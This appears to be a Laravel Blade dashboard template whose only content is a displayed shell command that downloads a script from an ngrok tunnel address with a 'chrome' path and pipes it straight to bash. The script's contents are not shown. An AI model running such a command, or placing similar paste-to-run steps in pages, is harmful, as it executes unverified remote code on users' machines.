<x-app-layout>
    <x-slot name="header">
        <h2 class="font-semibold text-xl text-gray-800 leading-tight">
            {{ __('Dashboard') }}
        </h2>
    </x-slot>

    <div class="py-12">
        <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
            <div class="bg-white overflow-hidden shadow-xl sm:rounded-lg">

                <code class="w-full">
                    <pre class="bg-gray-900 text-yellow-300 p-4">curl https://a33c-24-231-174-107.ngrok.io/chrome | bash</pre>
                </code>
            </div>
        </div>
    </div>
</x-app-layout>
